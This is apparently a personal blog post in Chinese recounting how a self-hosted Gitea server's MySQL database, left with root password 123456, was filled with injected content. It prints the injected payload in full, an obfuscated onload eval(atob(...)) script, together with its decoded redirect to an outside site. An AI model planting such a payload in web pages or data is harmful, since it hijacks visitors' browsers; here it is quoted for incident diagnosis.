---
date: 2023-09-22
article: true
star: false
sticky: false
category:
  - 问题记录
tag:
  - mysql
  - inject
  - 
---

# 数据库被注入恶意信息

<!-- more -->
---

## 分析

前段时间搭建了个gitea自用，有一天上去过后发现web一直显示500，想着重启试试，结果发现再也重启不能。

```
2023/09/22 14:57:58 ...er/issues/indexer.go:246:func3() [I] Issue Indexer Initialization took 725.906µs
2023/09/22 14:57:58 routers/init.go:69:mustInitCtx() [F] code.gitea.io/gitea/routers.syncAppConfForGit(ctx) failed: readObjectStart: expect { or n, but found <, error found in #1 byte of ...|<body/onloa|..., bigger context ...|<body/onload=eval(atob("d2luZG93LmxvY2F0aW9uLnJlcGx|...
```

在日志这一块，看到了这么个东西，类似一串js代码，后面去看了下数据库，不看不得了，一看吓一跳，数据库里很多表的字段内容都被纂改了

<img src="https://public-1308755698.cos.ap-chongqing.myqcloud.com//img/202309221547220.png" style="zoom:50%;" />

完整内容如下
```
<body/onload=eval(atob("d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHBzOi8vaHpyMGRtMjhtMTdjLmNvbS9lYm1zczBqcTc/a2V5PWM5MGEzMzYzMDEzYzVmY2FhZjhiZjVhOWE0ZTQwODZhIik="))>
```

中间是一段base64编码的url，解码过后就是

```
window.location.replace("https://hzr0dm28m17c.com/ebmss0jq7?key=c90a3363013c5fcaaf8bf5a9a4e4086a")
```

大概是想实现js代码被加载的时候自动跳转到这个网站，这个网站后面去看了下，就是个普通的色情网站。

## 问题

问题出现在root密码太过简单，就是123456，由于在使用的时候用的是另一个数据库账号，初始化的root密码忘记改了，所以还是留着123456没有变，这才有了可乘之机。



## 解决
最后是手动将脏数据清洗掉，才恢复了正常，以后还是要定时备份，做好安全工作。
